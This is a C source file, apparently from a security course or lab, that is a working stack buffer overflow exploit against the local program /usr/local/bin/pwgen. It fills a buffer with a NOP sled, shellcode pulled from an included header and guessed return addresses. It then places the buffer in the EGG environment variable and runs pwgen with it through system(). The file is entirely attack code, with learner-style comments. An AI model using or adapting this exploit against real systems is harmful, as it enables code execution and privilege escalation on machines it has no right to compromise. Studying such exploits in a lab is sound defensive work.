#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "/usr/local/src/shellcode.h"

#define TARGET "/usr/local/bin/pwgen"

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define NOP 0x90

unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
    //esp=stack pointer
    //eax, data register
}

int main(int argc, char *argv[])
{
  //char *args[4];
  //char *env[1];

  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset = DEFAULT_OFFSET, bsize = 612;
//long addr = 0xffbfd836;
  //int bsize = 612; 
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);  

  if (! (buff = malloc(bsize) ) ) { 
    printf("cannot allocate memory \n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) (ptr + 2); //offset is 2
  for (i = 0; i < bsize; i+=4) {
    *(addr_ptr++) = addr;
  }

  for (i = 0; i < bsize/2; i++) { //add NOP
    buff[i] = NOP;
  }

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2)); // add shellcode 
  for (i = 0; i < strlen(shellcode); i++) {
    *(ptr++) = shellcode[i];
  }

  buff[bsize - 1] = '\0';


/*args[0] = TARGET; 
  args[1] = "-e"; 
  args[2] = buff; 
  args[3] = NULL;

  env[0] = NULL;

 // execve only returns if it fails
  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);*/
  memcpy(buff,"EGG=", 4);
  putenv(buff); //changes the value of enviroment variable
                //enviroment var is a dynamic-named value that can affect the way running processes
                // will behave on a computer 
  system("pwgen -e$EGG\n\n"); //invoke an OS command from C
  return 0;
}
